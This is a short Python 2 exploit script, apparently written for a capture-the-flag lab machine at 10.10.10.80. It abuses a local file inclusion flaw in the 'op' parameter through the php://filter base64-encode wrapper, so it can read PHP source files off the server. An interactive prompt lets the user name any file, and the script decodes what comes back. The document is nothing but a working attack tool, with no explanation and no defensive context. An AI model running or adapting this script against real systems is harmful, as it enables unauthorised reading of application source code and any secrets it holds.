#!/usr/bin/python
import requests
import base64
import re

def GetPHP(file):
	r = requests.get("http://10.10.10.80/?op=php://filter/convert.base64-encode/resource="+file)
	result = re.search('PD9(.*?)<footer>',r.text).group(1)
	b64 = "PD9" + result + "=="
	return base64.b64decode(b64)
	
while True:
	cmd = raw_input("> ")
	try:
		output = GetPHP(cmd)
		print output
	except:
		if cmd == "exit" :
			break
		print "ERROR"

